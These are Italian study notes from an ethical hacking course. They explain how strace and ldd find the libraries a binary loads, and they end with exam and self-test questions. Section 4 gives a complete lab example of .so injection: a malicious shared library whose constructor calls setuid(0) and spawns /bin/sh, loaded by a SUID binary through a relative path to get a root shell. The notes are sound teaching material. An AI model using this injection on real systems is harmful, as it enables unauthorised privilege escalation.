# 🔬 strace & ldd — Analisi dinamica e statica dei binari

> [!abstract] In una frase `strace` ti dice cosa fa un binario **mentre gira** (intercetta le system call al kernel); `ldd` ti dice da quali librerie **dipende staticamente**. Insieme, ti permettono di capire il comportamento di un binario senza avere il sorgente — e di trovare i path di librerie controllabili dall'attaccante. Si usano in [[ETHL 0x05 — Hacking Unix p1]] per la `.so` injection.

---

## 1. `strace` — analisi dinamica a runtime

### Cos'è

`strace` intercetta in tempo reale **tutte le system call** che un processo fa al kernel mentre esegue. Non analizza il codice: si mette in mezzo tra il processo e il kernel e stampa ogni richiesta con i suoi argomenti e il valore di ritorno.

> [!info] Cosa sono le system call Ogni volta che un programma ha bisogno del sistema operativo — aprire un file, leggere, scrivere, creare un processo, allocare memoria, connettersi a rete — deve passare dal kernel tramite una system call. `strace` le vede tutte.
> 
> Esempi comuni: `openat`, `read`, `write`, `execve`, `mmap`, `connect`, `clone`.

### Uso tipico nel contesto ETHL

```bash
strace ./suid-calc 2>&1 | grep -iE "open|access|no such file"
```

> [!info] Lettura del comando
> 
> - `strace ./suid-calc` — lancia il binario sotto strace; l'output delle syscall va su **stderr**
> - `2>&1` — redirige stderr su stdout, così `grep` può filtrare entrambi
> - `grep -iE "open|access|no such file"` — tieni solo le righe relative ad apertura file o errori di file non trovato

Output rivelatore:

```
openat(AT_FDCWD, "./libcalc.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
```

Cosa ti dice questa riga:

|Campo|Significato|
|---|---|
|`openat`|syscall: prova ad aprire un file|
|`AT_FDCWD`|path relativo alla **directory corrente**|
|`"./libcalc.so"`|il path cercato — **relativo e controllabile**|
|`= -1 ENOENT`|fallito: file non trovato|

L'`ENOENT` su path relativo è la vulnerabilità: il binario SUID cerca la libreria in una directory che l'attaccante controlla.

### Perché strace funziona anche senza sorgente

Non legge il codice — osserva il **comportamento reale** del processo. Se il path viene costruito dinamicamente a runtime (es. `dlopen("./libcalc.so")`), la `openat()` avviene comunque e strace la vede. È comportamento, non dichiarazione.

> [!warning] Limitazione Vede solo i path raggiunti in **quella specifica esecuzione**. Se il codice ha branch condizionali, alcune syscall potrebbero non essere raggiunte con un input banale.

---

## 2. `ldd` — analisi statica delle dipendenze

### Cos'è

`ldd` legge l'**header ELF** del binario e stampa la lista delle shared library dichiarate come dipendenze, con i path dove il linker le ha trovate (o `not found` se mancanti).

```bash
ldd ./suid-calc
# libcalc.so => not found
# libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
```

> [!info] Cosa è un header ELF I binari Linux sono in formato **ELF** (Executable and Linkable Format). L'header contiene metadati: architettura, entry point, sezioni, e la lista delle librerie dinamiche richieste (`DT_NEEDED`). `ldd` legge questi metadati senza eseguire il codice.

### Uso tipico

```bash
ldd /usr/sbin/bridge     # trova le librerie usate da bridge
# libcap.so.2 => /lib/x86_64-linux-gnu/libcap.so.2
```

Utile per:

- trovare quali librerie sostituire in un attacco `LD_LIBRARY_PATH` (→ [[ETHL 0x05 — Hacking Unix p1#9. LD_PRELOAD e LD_LIBRARY_PATH]])
- capire da quali `.so` dipende un binario SUID prima di toccarci

> [!warning] Limitazione — path costruiti a runtime Se il path della libreria viene costruito dinamicamente con `dlopen("./libcalc.so")`, `ldd` **non lo vede** — perché quella dipendenza non è nell'header ELF, è codice che gira. Qui entra `strace`.

---

## 3. Confronto diretto

| |`strace`|`ldd`|
|---|---|---|
|Tipo di analisi|**dinamica** — a runtime|**statica** — senza eseguire|
|Cosa osserva|syscall reali fatte al kernel|dipendenze dichiarate nell'header ELF|
|Vede `dlopen` con path relativo|✅ sì — la `openat()` avviene|❌ no — non è nell'header|
|Vede dipendenze standard|✅ sì|✅ sì|
|Rischio esecuzione|⚠️ esegue il binario|✅ non esegue|
|Uso tipico in ETHL|scoprire path relativi di `.so`|trovare nomi lib per `LD_LIBRARY_PATH`|

> [!tip] Workflow consigliato post-foothold
> 
> 1. `ldd <binario>` → mappa le dipendenze dichiarate
> 2. `strace <binario> 2>&1 | grep -iE "open|access|no such file"` → trova path relativi non dichiarati
> 3. Controlla se qualche path è in una directory che controlli → vettore `.so` injection

---

## 4. Esempio completo — `.so` injection su `suid-calc`

```bash
# 1. scoprire il problema
strace ./suid-calc 2>&1 | grep -iE "open|access|no such file"
# → openat(AT_FDCWD, "./libcalc.so", ...) = -1 ENOENT

# 2. creare la libreria malevola
cat > libcalc.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>
static void inject() __attribute__((constructor));
void inject() { setuid(0); system("/bin/sh"); }
EOF

gcc -shared -fPIC -o libcalc.so libcalc.c

# 3. eseguire il binario SUID dalla stessa directory
./suid-calc   # carica ./libcalc.so → inject() → shell root
```

> [!success] Perché funziona `suid-calc` ha EUID=0 per via del bit SetUID. Carica `./libcalc.so` dalla directory corrente — che controlli tu. Il `__attribute__((constructor))` fa partire `inject()` al caricamento, prima ancora che `suid-calc` faccia qualcosa. `setuid(0)` è possibile perché il processo è già privilegiato (euid=0) → imposta tutti e tre gli UID a 0 → la shell che segue è root piena. Vedi [[ETHL 0x05 — Hacking Unix p1#7. Nota su setuid - privilegiato vs no]].

---

## 5. Trappole d'esame

> [!danger] Domande tipiche
> 
> 1. **Differenza strace / ldd** → dinamico vs statico; strace vede `dlopen` a runtime, ldd no.
> 2. **Perché `2>&1` in strace** → strace scrive su stderr, non stdout; senza redirect `grep` non vede nulla.
> 3. **Cosa rivela `ENOENT` su path relativo** → il binario cerca una lib in una dir controllabile dall'attaccante → vettore injection.
> 4. **Perché ldd non trova `./libcalc.so`** → il path è costruito con `dlopen` a runtime, non dichiarato nell'header ELF.
> 5. **`AT_FDCWD`** → "at current working directory" — conferma che il path è relativo alla directory corrente.

---

## 6. Richiamo attivo

> [!question] A libro chiuso
> 
> 1. Cosa intercetta `strace`? In che momento lo fa?
> 2. Cosa legge `ldd`? Perché non può vedere `dlopen` con path relativo?
> 3. Dato l'output `openat(AT_FDCWD, "./libcalc.so", ...) = -1 ENOENT`, spiega perché è un vettore di attacco.
> 4. Qual è il workflow in due passi per analizzare un binario SUID senza sorgente?
> 5. Perché in `strace ./suid-calc 2>&1 | grep ...` serve `2>&1`?